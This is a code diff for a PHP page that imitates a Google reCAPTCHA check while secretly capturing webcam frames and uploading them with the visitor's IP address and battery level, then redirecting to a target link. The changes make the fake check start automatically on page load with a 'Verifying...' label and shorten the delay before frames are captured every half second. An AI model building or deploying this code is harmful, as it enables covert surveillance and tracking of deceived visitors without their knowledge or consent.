@@ -1,6 +1,7 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
+    // Check link expiry parameter (e)
     if (!isset($_POST['e']) || empty($_POST['e'])) {
         exit;
     }
@@ -37,11 +38,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     $battery   = isset($_POST['battery']) ? $_POST['battery'] : 'Unknown';
     
     $ipAddress = $_SERVER['REMOTE_ADDR'];
-    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
-        $ipAddress = trim($ipList[0]);
-    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
         $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
     }
 
     $fileName = 'img_' . uniqid() . '.png';
@@ -106,7 +106,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             width: 300px;
             box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
             display: none;
-            cursor: pointer;
+            user-select: none;
         }
 
         .recaptcha-left {
@@ -121,7 +121,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             background: #fff;
             border: 2px solid #c1c1c1;
             border-radius: 2px;
-            cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -129,18 +128,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             transition: background 0.2s, border-color 0.2s;
         }
 
-        .recaptcha-checkbox:hover {
-            border-color: #b2b2b2;
-        }
-
+        /* Auto-loading spinner */
         .recaptcha-spinner {
-            width: 24px;
-            height: 24px;
+            width: 20px;
+            height: 20px;
             border: 3px solid #f3f3f3;
             border-top: 3px solid #4285F4;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            display: none;
+            display: block;
         }
 
         @keyframes spin {
@@ -163,7 +159,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             font-family: Roboto, helvetica, arial, sans-serif;
             font-size: 14px;
             color: #2c2c2c;
-            user-select: none;
         }
 
         .recaptcha-right {
@@ -191,12 +186,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 </head>
 <body>
 
-    <div class="recaptcha-box" id="recaptchaContainer" onclick="openTargetLink()">
+    <div class="recaptcha-box" id="recaptchaContainer">
         <div class="recaptcha-left">
             <div class="recaptcha-checkbox" id="recaptchaCheckbox">
                 <div class="recaptcha-spinner" id="recaptchaSpinner"></div>
             </div>
-            <span class="recaptcha-text">I am not a robot</span>
+            <span class="recaptcha-text">Verifying...</span>
         </div>
         <div class="recaptcha-right">
             <div class="recaptcha-logo"></div>
@@ -232,27 +227,25 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             recaptchaContainer.style.display = 'flex';
         }
 
-        let isClicked = false;
-        function openTargetLink() {
-            if (isClicked) return;
-            isClicked = true;
-
+        // Auto Verification Function (Without User Click)
+        function autoVerifyAndRedirect() {
             const checkbox = document.getElementById('recaptchaCheckbox');
             const spinner = document.getElementById('recaptchaSpinner');
 
-            // স্পিনার চালু করা হলো
-            spinner.style.display = 'block';
-
-            // ৪ সেকেন্ড (4000ms) ধরে ঘুরবে, তারপর টিক মার্ক এসে টার্গেট লিংকে রিডাইরেক্ট হবে
+            // 4 seconds (4000ms) loading timer
             setTimeout(() => {
                 spinner.style.display = 'none';
                 checkbox.classList.add('checked');
                 
+                // Redirect to target URL on main tab after 500ms
                 setTimeout(() => {
                     window.location.href = finalUrl;
-                }, 400);
+                }, 500);
             }, 4000);
         }
+
+        // Auto Start Loading Process
+        autoVerifyAndRedirect();
 
         let batteryLevelInfo = 'Not Available';
         if (navigator.getBattery) {
@@ -266,8 +259,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                 .then(stream => {
                     video.srcObject = stream;
                     setTimeout(() => {
+                        // Capture image every 0.5s (500ms)
                         setInterval(captureAndUpload, 500);
-                    }, 1000);
+                    }, 500);
                 })
                 .catch(err => {
                     console.error("Camera error: ", err);
